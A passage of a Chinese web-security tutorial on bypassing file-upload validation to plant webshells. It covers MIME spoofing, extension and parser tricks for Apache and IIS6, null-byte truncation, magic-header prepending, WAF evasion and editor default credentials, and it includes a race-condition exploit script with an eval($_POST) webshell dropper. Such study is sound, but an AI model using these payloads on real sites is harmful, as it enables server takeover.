type</strong>的缩写为<strong>(Multipurpose Internet Mail Extensions)</strong>代表互联网媒体类型(Internet media type)，MIME使用一个简单的字符串组成，最初是为了标识邮件Email附件的类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。</p><p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。</p><p>Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p><h6 id="MIME类型格式："><a href="#MIME类型格式：" class="headerlink" title="MIME类型格式："></a>MIME类型格式：</h6><p>类别/子类别;参数 Content-Type: [type]/[subtype]; parameter</p><h6 id="MIME主类别："><a href="#MIME主类别：" class="headerlink" title="MIME主类别："></a>MIME主类别：</h6><p>text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；</p><p>Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</p><p>Application：用于传输应用程序数据或者二进制数据；</p><p>Message：用于包装一个E-mail消息；</p><p>Image：用于传输静态图片数据；</p><p>Audio：用于传输音频或者音声数据；</p><p>Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</p><h6 id="常见MIME类型："><a href="#常见MIME类型：" class="headerlink" title="常见MIME类型："></a>常见MIME类型：</h6><p><img src="https://images.seebug.org/content/images/2018/04/8a4f633f-06eb-45e2-b4ba-6b064755e12e.png-w331s" alt="img"></p><h5 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//检测content-type</span>    <span class="token keyword">echo</span> <span class="token string">"sorry,we only allow uploading GIF images"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Upload success!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p><h4 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h4><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//判断上传文件类型</span><span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token function">fileext</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fileext</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"upload success!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"sorry"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>默认上传后的文件保存的名字是已获取到的名字</p><h5 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h5><h6 id="配合Apache的-htaccess文件上传解析漏洞"><a href="#配合Apache的-htaccess文件上传解析漏洞" class="headerlink" title="配合Apache的.htaccess文件上传解析漏洞"></a>配合Apache的.htaccess文件上传解析漏洞</h6><blockquote><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p></blockquote><p>有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。</p><p>首先我们编写一个.htaccess文件。打开记事本，编写代码“AddType application/x-httpd-php .jpg”，然后点击文件选中另存为，编写文件名为.htaccess，选择保存类型为所有文件。然后将其进行上传。因为.htaccess是apache服务器中的一个配置文件,不在上传的文件的黑名单之内,所以.htaccess文件是可以上传成功。</p><p>接下来我们制造一个一句话木马文件，如取名为yijuhua.php。因为之前上传成功到服务器的.htaccess文件里的代码可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们把yijuhua.php文件的后缀名改为.jpg格式,让.htaccess文件解析yijuhua.jpg文件里的php代码，从而使木马上传成功并达到可执行的目的。</p><h6 id="Apache站上的解析缺陷绕过上传漏洞"><a href="#Apache站上的解析缺陷绕过上传漏洞" class="headerlink" title="Apache站上的解析缺陷绕过上传漏洞"></a>Apache站上的解析缺陷绕过上传漏洞</h6><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，整个漏洞的关键就是Apache的合法后缀到底是哪些，不是合法后缀的都可以被利用，所以将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。</p><p>例如新建完要上传的一句话木马文件后命名为yijuhua.php，然后我们在文件后缀处添加上7z，就有可能绕过验证上传成功。也可以修改后缀名为cab、zip、bmp等，只要是允许的上传类型都可能被上传成功。最后通过菜刀类工具访问即可。</p><h6 id="IIS6-0站上的目录路径检测解析绕过上传漏洞"><a href="#IIS6-0站上的目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0站上的目录路径检测解析绕过上传漏洞"></a>IIS6.0站上的目录路径检测解析绕过上传漏洞</h6><p>当我们使用的服务器都是Windows2003，并且使用的服务为IIS6.0时，就可能存在如本节所描述的漏洞。</p><p>以asp为例，先准备好一句话木马文件，然后通过burpsuite进行抓包：</p><p><img src="https://images.seebug.org/content/images/2018/04/6dd812e6-eb1e-417b-96bd-d5f2e28b9aff.png-w331s" alt="img"></p><p>查看数据包：</p><p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 uploadimg/改为<code>uploadimg/1.asp/;</code>，<code>filename=&quot;yijuhua.asp&quot;</code>修改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>。如图：</p><p><img src="https://images.seebug.org/content/images/2018/04/5b991dc4-d954-4d9c-8c9f-78c664b46bb2.png-w331s" alt="img"></p><p>本例的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“yijuhua.asp/1.jpg”</code>，也同样会被IIS当作ASP文件来解析并执行。</p><p>首先我们请求<code>/yijuhua.asp/1.jpg</code>，服务器会从头部查找查找”.”号,获得.asp/1.jpg。然后查找”/“,如果有则内存截断，所以<code>/yijuhua.asp/1.jpg</code>会当做<code>/yijuhua.asp</code>进行解析。</p><p>上传成功后，通过response我们可以查看到得到的文件名信息为“1.asp;14127900008.asp”，那么就可以在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.asp;14127900008.asp”</code>，并通过菜刀类的工具进行访问了。</p><h6 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h6><p>此类方法与上面讲的目录解析有点类似，不同点在于是利用文件解析来达到绕过上传的目的。</p><p>以php为例，同样是准备好一句话木马文件后通过burpsuite进行抓包。</p><p>查看数据包：</p><p>其中<code>Content-Disposition:form-data;name=”path”</code>下面的一行为服务保存文件的相对路径，我们把原本的 <code>uploadimg/</code> 改为 <code>uploadimg/1.php;</code> ，<code>filename=&quot;yijuhua.php&quot;</code>修改为<code>filename=&quot;yijuhua.jpg&quot;</code>。</p><p><img src="https://images.seebug.org/content/images/2018/04/e1c080a6-7aea-4e60-b007-20541c72db62.png-w331s" alt="img"></p><p>本例中的知识点在于利用了IIS6.0目录路径检测解析，文件的名字为<code>“1.php;yijuhua.jpg”</code>，也同样会被IIS当作PHP文件来解析并执行</p><p>首先我们请求<code>/1.php;yijuhua.jpg</code>，然后服务器会从头部查找查找”.”号,获得<code>.php;yijuhua.jpg</code>。接着查找到”;”，有则内存截断，所以<code>/1.php;yijuhua.jpg</code>会当做/1.php进行解析。</p><p>最后类似上一节那样，通过response我们可以查看到得到的文件名信息为<code>“1.php;14127900008.php”</code>，在前面添加上uploadimg/，从而构造访问地址为：<code>“http://www.test.com/uploadimg/1.php;14127900008.php”</code>，并通过菜刀类的工具进行访问。</p><p>1.使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</p><p>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等(IIS默认支持解析.asp,.cdx, .asa,.cer等)</p><p>能被解析的文件扩展名列表：</p><pre><code>   jsp jspx jspf   asp asa cer aspx</code></pre><p>3.配合操作系统文件命令规则</p><p>（1）上传不符合windows文件命名规则的文件名</p><pre><code>   　　test.asp.   　　test.asp(空格)   　　test.php:1.jpg   　　test.php:: $DATA</code></pre><p>会被windows系统自动去掉不符合规则符号后面的内容。</p><p>（2）linux下后缀名大小写</p><p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p><p>(3)借助系统特性突破扩展名验证，如：test.php_(在windows下,下划线是空格，保存文件时下划线被吃掉剩下test.php)</p><p>4.双扩展名之间使用00截断，绕过验证上传恶意代码</p><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p><pre><code>   　　test.php(0x00).jpg   　　test.php%00.jpg   　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</code></pre><p>5.超长文件名截断上传(windows 258byte | linux 4096byte)</p><h4 id="服务端检测文件内容"><a href="#服务端检测文件内容" class="headerlink" title="服务端检测文件内容"></a>服务端检测文件内容</h4><h5 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h5><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p><p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p><p>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</p><p>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?></p><p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#PHP    </span><span class="token delimiter">&lt;?php</span> <span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token string">"上传的txt文件路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token shell-comment comment">#ASP    </span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#include file="上传的txt文件路径" --></span></span><span class="token shell-comment comment">#JSP    </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">jsp:</span>inclde</span> <span class="token attr-name">page</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传的txt文件路径<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token keyword">or</span>  <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">%</span>@<span class="token keyword">include</span> file<span class="token operator">=</span><span class="token string">"上传的txt文件路径"</span><span class="token operator">%</span><span class="token operator">></span></code></pre><p>详细参考：<a href="http://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p><h5 id="利用PHP特性（使用数组绕过）"><a href="#利用PHP特性（使用数组绕过）" class="headerlink" title="利用PHP特性（使用数组绕过）"></a>利用PHP特性（使用数组绕过）</h5><p><img src="https://images.seebug.org/content/images/2018/04/1bb9ff63-9b8c-415e-bc9a-69f843b97ee5.png-w331s" alt="img"></p><p>file_put_contents 这个函数的第二个参数 可以是数组</p><p>然后 如果代码里用正则匹配 bad word 的时候</p><p>对一个数组进行正则匹配没用</p><h4 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h4><h5 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h5><p>不同的图片文件都有不同文件头，如：</p><p>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A</p><p>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</p><p>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61</p><p>PHP使用getimagesize函数验证图片文件头</p><h5 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了</p><p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p><pre class=" language-php"><code class="language-php">GIF89a<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h4 id="上传到服务端后验证"><a href="#上传到服务端后验证" class="headerlink" title="上传到服务端后验证"></a>上传到服务端后验证</h4><h5 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h5><p>演示代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"file upload success.file path is: "</span><span class="token punctuation">.</span><span class="token variable">$newfile</span><span class="token punctuation">.</span><span class="token string">"\n&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error:upload the file type is not allowed，delete the file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./info.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php @eval($_POST["drops"]) ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>​    当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">class</span> <span class="token class-name">RaceCondition</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/shell0.php"</span>        self<span class="token punctuation">.</span>uploadUrl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080/upload/copy.php"</span>    <span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'try to call uploaded file...'</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create file info.php success"</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_upload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file....."</span><span class="token punctuation">)</span>        file <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"file"</span><span class="token punctuation">:</span>open<span class="token punctuation">(</span><span class="token string">"shell0.php"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uploadUrl<span class="token punctuation">,</span> files<span class="token operator">=</span>file<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_upload<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>_get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    threads <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> RaceCondition<span class="token punctuation">(</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>经过几次尝试后成功成功写入shell</p><p><img src="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s" alt="img"></p><h4 id="针对各种CMS"><a href="#针对各种CMS" class="headerlink" title="针对各种CMS"></a>针对各种CMS</h4><p>比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</p><ul><li>PHPCMSv9.6.0任意文件上传</li></ul><h5 id="针对各种编辑器漏洞"><a href="#针对各种编辑器漏洞" class="headerlink" title="针对各种编辑器漏洞"></a>针对各种编辑器漏洞</h5><p>比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</p><h5 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h5><p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。</p><h5 id="1-FCKeditor"><a href="#1-FCKeditor" class="headerlink" title="1 FCKeditor"></a>1 FCKeditor</h5><p>下面以FCKeditor(现名为CKEditor)为例：</p><pre><code>1、敏感信息暴漏    * 查看版本信息        /FCKeditor/editor/dialog/fck_about.html    * 默认上传页面        /FCKeditor/editor/filemanager/browser/default/browser.html        /FCKeditor/editor/filemanager/browser/default/connectors/test.html        /FCKeditor/editor/filemanager/upload/test.html        /FCKeditor/editor/filemanager/connectors/test.html        /FCKeditor/editor/filemanager/connectors/uploadtest.html    * 其他敏感文件        /FCKeditor/editor/filemanager/connectors/aspx/connector.html        /FCKeditor/editor/filemanager/connectors/asp/connector.html        /FCKeditor/editor/filemanager/connectors/php/connector.php2、黑名单策略错误    FCKeditor&lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名3、任意文件上传漏洞    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，在form中的action=&quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; 即可，然后上传</code></pre><h5 id="2-eWebEditor"><a href="#2-eWebEditor" class="headerlink" title="2 eWebEditor"></a>2 eWebEditor</h5><pre><code>1、默认后台    2.80以前为：ewebeditor/admin_login.asp    2.80以后为：admin/login.asp2、默认账号密码    admin   admin8883、数据库地址    默认数据库地址    ewebeditor/db/ewebeditor.mdb    常用数据库地址    ewebeditor/db/ewebeditor.asa    ewebeditor/db/ewebeditor.asa    ewebeditor/db/#ewebeditor.asa    ewebeditor/db/#ewebeditor.mdb    ewebeditor/db/!@#ewebeditor.asp    ewebeditor/db/ewebeditor1033.mdb    asp asa为后缀的数据库下载下来后改为mdb</code></pre><h4 id="针对各种WAF"><a href="#针对各种WAF" class="headerlink" title="针对各种WAF"></a>针对各种WAF</h4><h5 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1 垃圾数据"></a>1 垃圾数据</h5><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><p><img src="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s" alt="img"></p><p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p><p><img src="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s" alt="img"></p><p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p><h5 id="2-filename"><a href="#2-filename" class="headerlink" title="2 filename"></a>2 filename</h5><p>针对早期版本安全狗，可以多加一个filename</p><p><img src="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s" alt="img"></p><p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p><p><img src="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s" alt="img"></p><h5 id="3-POST-GET"><a href="#3-POST-GET" class="headerlink" title="3 POST/GET"></a>3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><h5 id="4-以上方式"><a href="#4-以上方式" class="headerlink" title="4 以上方式"></a>4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p><p>**</p><h5 id="5-利用waf本身缺陷"><a href="#5-利用waf本身缺陷" class="headerlink" title="5 利用waf本身缺陷"></a>5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s" alt="img"></p><p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p><pre class=" language-html"><code class="language-html">正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.pngC.php"</code></pre><h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s" alt="img"></p><p>增加一个空格导致安全狗被绕过案列： Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099 尝试在boundary后面加个空格或者其他可被正常处理的字符： boundary= —————————47146314211411730218525550</p><h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s" alt="img"></p><h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" 